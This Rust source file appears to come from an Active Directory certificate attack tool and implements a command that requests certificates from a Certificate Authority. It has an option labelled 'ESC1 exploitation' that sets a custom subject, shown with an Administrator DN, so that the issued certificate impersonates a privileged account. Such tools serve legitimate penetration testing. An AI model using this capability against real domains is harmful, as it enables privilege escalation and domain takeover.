//! Request a certificate from a Certificate Authority
//!
//! This command creates a certificate request using a specified template
//! and submits it to a Certificate Authority for issuance.

use crate::enrollment::enrollment::CertificateEnrollment;
use crate::error::Result;

/// Configuration for CertRequest command
#[derive(Debug, Clone)]
pub struct CertRequestConfig {
    /// Template name to use for the request
    pub template: String,
    /// CA configuration string (e.g., "CA01\\CA-Name")
    pub ca_config: String,
    /// Optional custom subject DN (for ESC1 exploitation)
    pub subject: Option<String>,
    /// Install the certificate automatically if issued
    pub install: bool,
    /// Machine context (use machine account instead of user)
    pub machine: bool,
}

impl CertRequestConfig {
    /// Create a new configuration
    ///
    /// # Arguments
    ///
    /// * `template` - Template name
    /// * `ca_config` - CA configuration string
    ///
    /// # Example
    ///
    /// ```
    /// use certify::commands::cert_request::CertRequestConfig;
    ///
    /// let config = CertRequestConfig::new("WebServer", "CA01\\MyCA");
    /// assert_eq!(config.template, "WebServer");
    /// ```
    pub fn new(template: impl Into<String>, ca_config: impl Into<String>) -> Self {
        Self {
            template: template.into(),
            ca_config: ca_config.into(),
            subject: None,
            install: false,
            machine: false,
        }
    }

    /// Set a custom subject DN (ESC1 exploitation)
    ///
    /// # Example
    ///
    /// ```
    /// use certify::commands::cert_request::CertRequestConfig;
    ///
    /// let config = CertRequestConfig::new("User", "CA")
    ///     .with_subject("CN=Administrator,CN=Users,DC=example,DC=com");
    /// ```
    pub fn with_subject(mut self, subject: impl Into<String>) -> Self {
        self.subject = Some(subject.into());
        self
    }

    /// Enable automatic installation of the certificate
    pub fn install(mut self, enabled: bool) -> Self {
        self.install = enabled;
        self
    }

    /// Use machine context instead of user context
    pub fn machine(mut self, enabled: bool) -> Self {
        self.machine = enabled;
        self
    }
}

/// Execute the CertRequest command
///
/// Requests a certificate from the CA using the specified template.
/// Optionally allows specifying a custom subject (ESC1).
///
/// # Arguments
///
/// * `config` - Command configuration
///
/// # Returns
///
/// Success message with certificate information
///
/// # Example
///
/// ```no_run
/// use certify::commands::cert_request::{CertRequestConfig, execute};
///
/// let config = CertRequestConfig::new("WebServer", "CA01\\MyCA")
///     .install(true);
/// // let output = execute(&config)?;
/// # Ok::<(), certify::CertifyError>(())
/// ```
pub fn execute(config: &CertRequestConfig) -> Result<String> {
    // Create enrollment context
    let enrollment = CertificateEnrollment::new()?;

    // Request certificate (with or without custom subject)
    let result = if let Some(ref subject) = config.subject {
        // ESC1: Custom subject specified
        enrollment.request_certificate_with_subject(&config.template, &config.ca_config, subject)?
    } else {
        // Normal request
        enrollment.request_certificate(&config.template, &config.ca_config)?
    };

    // Format output message
    let mut output = String::new();
    output.push_str("\n[*] Certificate request submitted\n");
    output.push_str(&format!("    Template: {}\n", config.template));
    output.push_str(&format!("    CA: {}\n", config.ca_config));

    if let Some(ref subject) = config.subject {
        output.push_str(&format!("    Subject: {}\n", subject));
        output.push_str("    [ESC1] Custom subject specified\n");
    }

    if config.machine {
        output.push_str("    Context: Machine\n");
    }

    output.push_str(&format!("    Status: {:?}\n", result.status));

    if let Some(request_id) = result.request_id {
        output.push_str(&format!("    Request ID: {}\n", request_id));
    }

    // Handle result based on status
    match result.status {
        crate::enrollment::enrollment::EnrollmentStatus::Issued => {
            output.push_str("\n[+] Certificate issued successfully\n");

            if let Some(ref cert) = result.certificate {
                output.push_str(&format!("    Certificate size: {} bytes\n", cert.len()));

                if config.install {
                    enrollment.install_certificate(cert)?;
                    output.push_str("[+] Certificate installed to personal store\n");
                }
            }
        }
        crate::enrollment::enrollment::EnrollmentStatus::Pending => {
            output.push_str("\n[!] Certificate request is pending manager approval\n");
            if let Some(request_id) = result.request_id {
                output.push_str(&format!(
                    "    Use request ID {} to download the certificate later\n",
                    request_id
                ));
            }
        }
        crate::enrollment::enrollment::EnrollmentStatus::Denied => {
            output.push_str("\n[!] Certificate request was denied\n");
            if let Some(ref error) = result.error_message {
                output.push_str(&format!("    Reason: {}\n", error));
            }
        }
        crate::enrollment::enrollment::EnrollmentStatus::Failed => {
            output.push_str("\n[!] Certificate request failed\n");
            if let Some(ref error) = result.error_message {
                output.push_str(&format!("    Error: {}\n", error));
            }
        }
        crate::enrollment::enrollment::EnrollmentStatus::Installed => {
            output.push_str("\n[+] Certificate issued and installed\n");
        }
    }

    Ok(output)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cert_request_config_new() {
        let config = CertRequestConfig::new("WebServer", "CA01\\MyCA");
        assert_eq!(config.template, "WebServer");
        assert_eq!(config.ca_config, "CA01\\MyCA");
        assert!(config.subject.is_none());
        assert!(!config.install);
        assert!(!config.machine);
    }

    #[test]
    fn test_cert_request_config_with_subject() {
        let config = CertRequestConfig::new("User", "CA")
            .with_subject("CN=Administrator,DC=example,DC=com");

        assert_eq!(
            config.subject,
            Some("CN=Administrator,DC=example,DC=com".to_string())
        );
    }

    #[test]
    fn test_cert_request_config_builder() {
        let config = CertRequestConfig::new("Template", "CA")
            .with_subject("CN=Test")
            .install(true)
            .machine(true);

        assert_eq!(config.subject, Some("CN=Test".to_string()));
        assert!(config.install);
        assert!(config.machine);
    }

    #[test]
    fn test_config_clone() {
        let config1 = CertRequestConfig::new("Tmpl", "CA")
            .install(true)
            .machine(true);
        let config2 = config1.clone();

        assert_eq!(config1.template, config2.template);
        assert_eq!(config1.install, config2.install);
        assert_eq!(config1.machine, config2.machine);
    }
}
